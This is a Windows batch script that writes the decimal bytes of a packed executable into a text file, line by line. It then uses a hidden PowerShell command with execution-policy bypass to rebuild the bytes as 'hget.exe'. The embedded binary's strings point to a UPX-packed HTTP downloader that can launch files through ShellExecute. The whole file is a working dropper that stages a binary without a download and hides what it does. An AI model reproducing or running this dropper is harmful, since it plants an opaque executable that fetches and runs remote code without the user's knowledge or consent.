@echo off
echo|set /p=>456.hex
echo|set /p=77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 240 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 >>456.hex
echo|set /p=196 1 12 77 128 96 98 30 128 96 98 30 128 96 98 30 147 104 63 30 130 96 98 30 251 124 110 30 129 96 98 30 128 96 98 30 140 96 98 30 234 124 96 30 149 96 98 30 128 96 99 30 138 96 98 30 122 67 123 30 133 96 98 30 134 67 105 30 129 96 98 30 71 102 100 30 129 96 98 30 82 105 99 104 128 96 98 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 3 0 208 119 145 61 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 224 0 15 1 11 1 6 0 0 16 0 0 0 16 0 0 0 80 0 0 144 102 0 0 0 96 0 0 0 112 0 0 0 0 64 0 0 16 0 0 0 2 0 0 4 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 128 0 0 0 16 0 0 0 0 0 0 3 0 0 0 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 164 115 0 0 16 1 0 0 0 112 0 0 164 3 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 85 80 88 48 0 0 0 0 0 80 0 0 0 16 0 0 0 0 0 0 0 4 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 224 85 80 88 49 0 0 0 0 0 16 0 0 0 96 0 0 0 8 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 224 46 114 115 114 99 0 0 0 0 16 0 0 0 112 0 0 0 6 0 0 0 12 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 49 46 50 48 0 85 80 88 33 12 9 2 9 27 44 197 123 61 196 251 83 53 67 0 0 139 6 0 0 0 80 0 0 38 0 0 142 >>456.hex
echo|set /p=187 251 111 255 129 236 24 4 0 0 185 129 3 0 83 85 86 139 180 36 40 14 87 106 0 1 188 253 255 125 141 124 36 44 7 243 165 104 240 48 64 0 255 21 104 32 5 139 29 28 198 254 223 255 240 133 246 117 12 104 216 22 211 131 196 4 51 246 104 204 34 0 108 151 187 103 51 61 68 36 48 80 86 19 108 177 179 191 221 133 192 137 15 28 15 132 122 1 0 31 2 35 255 109 187 238 140 36 56 16 104 123 64 81 40 4 89 232 131 253 1 115 254 7 187 251 33 141 >>456.hex
echo|set /p=148 36 36 25 82 104 176 98 8 51 192 95 94 93 91 129 196 206 116 110 251 173 194 3 190 29 111 8 89 7 251 118 236 16 141 132 47 141 76 6 80 81 104 148 52 12 185 253 110 187 185 128 37 57 141 188 213 2 29 84 36 24 243 171 139 233 186 183 187 35 28 82 47 44 2 121 4 80 122 112 198 182 243 157 30 32 106 0 139 68 152 48 25 85 46 246 182 217 26 12 3 116 57 86 104 112 86 32 217 16 190 185 32 143 209 119 161 104 108 0 137 255 255 255 238 139 208 28 >>456.hex
echo|set /p=16 43 208 184 211 77 98 16 247 226 139 202 139 198 193 233 6 65 51 210 247 241 85 139 182 233 110 182 248 35 16 131 236 8 220 44 137 124 84 253 185 237 238 51 255 5 28 223 108 9 137 98 11 220 13 128 118 50 247 221 37 221 28 36 20 82 45 16 104 64 127 157 255 187 109 186 60 204 131 196 24 131 248 1 117 54 106 5 87 132 103 235 222 79 87 80 104 56 33 87 205 96 140 65 123 216 15 121 81 104 40 235 10 104 16 175 139 84 229 161 96 48 155 40 116 86 33 88 >>456.hex
echo|set /p=94 216 109 44 15 4 93 87 232 55 2 188 139 62 124 252 91 12 106 255 3 124 114 26 20 50 255 0 225 247 240 17 103 12 139 70 4 57 36 247 86 8 108 182 229 8 157 134 8 179 16 49 80 237 32 220 246 183 118 22 61 4 117 33 139 78 12 137 12 23 57 247 195 217 22 88 63 117 11 199 49 82 125 237 255 193 52 124 8 82 232 111 253 255 255 94 95 139 130 195 195 220 119 211 232 16 139 8 81 140 236 181 25 238 199 22 176 144 0 151 53 145 104 184 92 222 193 118 >>456.hex
echo|set /p=223 104 104 97 214 93 104 20 9 4 94 45 92 251 253 202 47 87 104 152 50 33 139 124 100 37 249 102 135 221 14 108 50 58 96 9 20 48 67 38 185 13 10 252 49 192 151 223 47 184 95 92 216 236 106 255 104 136 130 224 20 100 161 255 219 123 115 204 253 100 137 37 7 35 224 83 86 87 137 101 232 199 69 231 237 108 191 252 15 106 1 255 76 92 199 5 212 179 16 100 115 0 9 216 77 72 126 62 219 238 13 208 15 137 8 13 68 21 204 16 161 64 112 111 112 255 12 8 >>456.hex
echo|set /p=137 13 220 14 16 4 204 161 192 9 55 217 92 107 70 14 144 120 88 24 27 185 179 221 194 156 107 48 144 8 48 42 146 171 190 217 254 179 71 200 85 216 141 69 216 80 98 196 81 141 85 224 82 223 35 219 223 14 212 80 141 77 228 81 63 56 20 104 4 58 0 183 118 186 37 136 52 44 133 139 69 13 15 183 183 224 60 77 212 81 12 228 82 149 12 224 137 223 182 77 195 69 220 237 48 235 34 31 236 163 139 9 137 77 90 193 124 141 208 27 62 140 200 255 158 97 178 221 >>456.hex
echo|set /p=47 208 82 161 40 12 236 248 194 89 216 71 240 38 13 71 91 139 229 93 92 179 185 79 168 255 37 44 37 5 60 204 0 156 207 225 186 28 3 142 36 79 226 91 88 35 33 207 187 15 13 131 140 124 11 79 80 84 0 60 65 80 97 0 80 63 255 66 170 117 213 78 199 99 3 161 84 89 130 160 9 242 255 255 17 66 97 100 32 117 114 108 44 32 111 114 32 68 78 83 32 101 114 114 185 239 183 255 46 10 0 79 112 101 110 101 26 37 115 46 13 10 39 111 15 247 255 149 >>456.hex
echo|set /p=255 52 68 111 119 110 108 111 27 46 49 102 32 107 98 32 116 111 38 178 177 63 108 32 64 15 47 115 101 99 46 51 10 47 185 255 183 221 45 49 48 4 98 121 116 101 32 84 114 97 110 115 102 104 219 222 170 182 67 46 0 17 70 105 108 21 100 40 255 235 118 7 58 40 76 45 62 82 41 69 67 111 117 108 100 110 131 117 221 246 39 116 32 99 46 97 60 102 43 58 150 87 107 183 255 219 73 78 1 69 84 46 68 76 76 0 73 110 105 35 119 105 5 181 255 118 151 108 >>456.hex
echo|set /p=116 196 0 77 111 122 49 108 97 47 52 46 48 32 181 223 118 251 40 99 111 109 112 68 105 98 66 41 27 114 117 210 240 63 178 173 73 7 61 0 32 66 121 32 76 105 111 110 183 255 215 189 21 87 101 108 52 101 227 104 116 116 112 58 47 47 119 0 46 99 83 214 109 219 110 104 28 107 101 46 27 32 61 10 237 87 54 123 120 14 89 72 85 67 32 211 73 216 220 194 109 109 2 100 98 172 32 32 247 46 132 185 86 247 53 235 48 46 50 48 179 183 237 216 195 32 107 102 >>456.hex
echo|set /p=137 117 115 129 58 207 115 115 23 26 150 185 64 15 147 0 47 40 115 116 123 177 96 238 46 101 120 183 8 147 59 198 53 28 97 43 50 32 30 10 40 124 11 133 51 47 91 69 120 97 100 246 225 7 107 163 93 59 60 72 84 84 80 225 124 70 7 205 157 253 118 62 18 76 111 99 97 108 11 91 101 42 22 8 183 119 55 85 115 97 103 72 111 102 29 4 24 49 246 78 0 1 45 168 128 108 17 13 255 95 158 163 140 16 1 76 111 97 100 76 105 98 114 97 114 121 3 112 >>456.hex
echo|set /p=2 150 65 67 93 146 118 9 248 59 12 71 101 116 84 105 99 107 122 110 116 13 1 248 110 246 87 114 105 25 37 108 111 115 101 72 156 219 167 217 90 12 73 153 24 95 95 20 116 18 176 117 0 140 109 66 104 122 100 219 86 182 50 112 57 102 7 115 8 182 174 237 254 116 114 110 99 112 121 43 101 120 77 6 88 13 116 182 131 185 230 83 88 45 18 95 112 2 95 173 149 111 215 46 108 110 118 84 103 80 15 230 186 231 110 159 103 115 14 24 45 109 10 183 4 188 247 219 >>456.hex
echo|set /p=106 109 116 95 102 100 105 39 54 220 176 193 190 134 109 111 100 101 13 102 11 150 221 142 125 219 44 112 17 116 121 112 101 122 99 101 117 95 104 249 182 153 237 191 73 51 55 110 152 111 108 102 112 79 179 221 156 162 243 109 112 215 164 96 83 52 219 246 111 204 108 108 69 120 101 99 117 120 65 23 176 104 8 26 128 251 73 110 136 254 7 236 11 107 34 65 14 85 114 108 17 82 101 66 88 118 104 170 56 17 64 33 255 229 67 166 80 69 76 1 4 0 208 119 145 61 236 179 >>456.hex
echo|set /p=35 255 224 0 15 1 11 1 6 0 48 19 64 19 0 15 193 186 89 236 32 13 11 3 4 51 242 97 246 102 7 80 23 235 3 0 151 189 129 13 16 7 6 0 148 0 123 131 117 79 100 82 160 48 0 194 64 214 141 87 124 30 46 15 100 203 158 238 120 116 184 240 16 3 66 225 217 54 62 96 46 114 100 84 97 155 54 32 3 120 205 101 3 2 64 46 38 41 25 164 123 59 2 39 48 48 12 54 216 183 192 79 115 114 99 0 235 64 79 64 48 124 191 149 4 116 33 13 >>456.hex
echo|set /p=143 250 0 0 0 0 0 0 36 0 255 0 0 0 0 0 96 190 0 96 64 0 141 190 0 176 255 255 87 131 205 255 235 16 144 144 144 144 144 144 138 6 70 136 7 71 1 219 117 7 139 30 131 238 252 17 219 114 237 184 1 0 0 0 1 219 117 7 139 30 131 238 252 17 219 17 192 1 219 115 239 117 9 139 30 131 238 252 17 219 115 228 49 201 131 232 3 114 13 193 224 8 138 6 70 131 240 255 116 116 137 197 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 117 >>456.hex
echo|set /p=7 139 30 131 238 252 17 219 17 201 117 32 65 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 115 239 117 9 139 30 131 238 252 17 219 115 228 131 193 2 129 253 0 243 255 255 131 209 1 141 20 47 131 253 252 118 15 138 2 66 136 7 71 73 117 247 233 99 255 255 255 144 139 2 131 194 4 137 7 131 199 4 131 233 4 119 241 1 207 233 76 255 255 255 94 137 247 185 9 0 0 0 138 7 71 44 232 60 1 119 247 128 63 0 117 242 139 7 138 95 4 102 193 232 >>456.hex
echo|set /p=8 193 192 16 134 196 41 248 128 235 232 1 240 137 7 131 199 5 137 216 226 217 141 190 0 64 0 0 139 7 9 192 116 60 139 95 4 141 132 48 164 99 0 0 1 243 80 131 199 8 255 150 8 100 0 0 149 138 7 71 8 192 116 220 137 249 87 72 242 174 85 255 150 12 100 0 0 9 192 116 7 137 3 131 195 4 235 225 255 150 16 100 0 0 97 233 92 171 255 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 0 3 0 0 0 32 0 0 128 14 0 0 0 96 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 56 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 4 8 0 0 80 0 0 0 164 112 0 0 232 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 101 0 0 0 120 0 0 128 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 1 0 4 8 0 0 144 0 0 0 144 115 0 0 20 0 0 0 0 0 0 0 0 0 0 0 160 64 0 0 40 0 0 0 32 0 0 0 64 0 0 0 1 0 4 0 0 0 0 0 128 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 128 0 0 0 128 128 0 128 0 0 0 128 0 128 0 128 128 0 0 192 192 192 0 128 128 128 0 0 0 255 0 0 255 0 0 0 255 255 0 255 0 0 0 >>456.hex
echo|set /p=255 0 255 0 255 255 0 0 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 136 136 136 136 136 136 136 136 128 0 0 0 0 0 0 136 136 136 136 136 136 136 128 0 0 136 0 0 0 0 0 8 136 136 136 136 136 136 8 135 7 247 0 0 0 0 0 0 0 0 0 0 0 0 8 112 15 240 0 0 0 0 0 0 0 0 0 0 0 0 8 112 143 112 0 0 0 0 0 0 0 0 0 0 0 0 135 112 143 112 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 119 0 247 0 0 0 0 0 0 7 7 7 0 0 8 143 240 8 247 0 0 0 0 0 0 0 135 119 112 0 143 255 128 143 119 0 0 0 7 7 8 128 135 119 8 128 255 248 136 255 112 0 0 8 119 119 0 0 0 8 119 248 0 136 255 247 0 0 0 8 135 112 0 255 247 0 7 136 136 143 247 135 7 0 0 0 136 0 7 255 255 112 8 136 255 119 128 0 0 128 0 0 0 7 240 0 255 247 128 135 119 136 128 0 8 128 0 0 0 127 127 >>456.hex
echo|set /p=255 255 255 112 8 120 128 0 0 7 0 0 0 0 240 15 255 255 247 119 8 128 0 0 0 7 0 0 0 0 128 255 240 0 119 119 0 0 0 0 0 7 0 0 0 7 248 15 255 0 247 119 0 0 0 0 0 7 0 0 0 0 240 143 255 240 255 119 0 0 0 0 0 8 0 0 0 7 0 143 248 0 255 119 112 0 0 0 0 0 128 0 0 8 0 143 240 0 247 119 112 0 0 0 0 0 0 0 0 0 136 255 240 255 119 119 120 128 0 0 0 0 0 0 0 7 120 119 >>456.hex
echo|set /p=119 119 0 119 127 120 0 0 0 0 0 0 0 0 119 119 0 0 7 120 240 0 0 0 0 0 0 0 0 0 0 120 135 119 119 136 128 0 0 0 0 0 0 0 0 0 0 0 119 119 119 120 128 0 0 0 0 0 0 0 8 136 135 119 112 120 128 136 0 0 0 0 0 0 0 0 0 8 136 136 7 120 0 136 0 0 0 0 0 0 0 0 0 0 0 0 136 128 0 128 0 0 0 0 0 0 0 0 0 0 0 136 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 255 255 255 255 241 0 0 1 231 0 0 1 239 128 0 1 239 255 252 3 143 255 248 3 159 255 240 3 255 129 192 7 255 0 128 7 128 0 0 7 0 0 0 7 0 0 0 3 0 0 0 3 0 0 0 3 128 0 0 195 224 0 1 195 224 0 7 199 224 0 31 135 192 0 63 135 192 0 63 131 128 0 63 193 128 0 31 225 0 0 15 241 0 0 3 255 192 0 1 255 96 0 63 255 0 0 63 255 0 0 63 255 128 0 127 255 >>456.hex
echo|set /p=192 0 127 255 248 28 255 255 240 63 255 255 136 67 0 0 0 0 1 0 1 0 32 32 16 0 1 0 4 0 232 2 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 48 116 0 0 8 116 0 0 0 0 0 0 0 0 0 0 0 0 0 0 61 116 0 0 24 116 0 0 0 0 0 0 0 0 0 0 0 0 0 0 72 116 0 0 32 116 0 0 0 0 0 0 0 0 0 0 0 0 0 0 84 116 0 0 40 116 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 96 116 0 0 110 116 0 0 126 116 0 0 0 0 0 0 140 116 0 0 0 0 0 0 146 116 0 0 0 0 0 0 162 116 0 0 0 0 0 0 75 69 82 78 69 76 51 50 46 68 76 76 0 77 83 86 67 82 84 46 100 108 108 0 83 72 69 76 76 51 50 46 100 108 108 0 87 73 78 73 78 69 84 46 100 108 108 0 0 0 76 111 97 100 76 105 98 114 97 114 121 65 0 0 71 101 116 80 114 111 99 65 100 100 114 101 115 115 0 0 >>456.hex
echo|set /p=69 120 105 116 80 114 111 99 101 115 115 0 0 0 101 120 105 116 0 0 83 104 101 108 108 69 120 101 99 117 116 101 65 0 0 0 73 110 116 101 114 110 101 116 79 112 101 110 65 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=>>456.hex
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[string]$hex = get-content -path 456.hex;[Byte[]] $temp = $hex -split ' ';[System.IO.File]::WriteAllBytes('hget.exe', $temp)"
